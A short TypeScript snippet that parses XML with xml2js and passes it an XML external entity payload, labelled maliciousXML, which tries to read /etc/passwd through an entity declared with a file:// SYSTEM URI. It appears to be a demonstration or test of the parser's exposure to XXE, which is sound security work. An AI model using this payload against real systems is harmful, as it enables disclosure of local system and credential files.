import * as xml2js from 'xml2js';

function parseXML(xmlData: string): Promise<any> {
    return new Promise((resolve, reject) => {
        xml2js.parseString(xmlData, { explicitArray: false }, (err, result) => {
            if (err) {
                reject(err);
            } else {
                resolve(result);
            }
        });
    });
}

const maliciousXML = `
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`;

parseXML(maliciousXML)
    .then((result) => {
        console.log('Parsed XML:', result);
    })
    .catch((error) => {
        console.error('Error parsing XML:', error);
    });
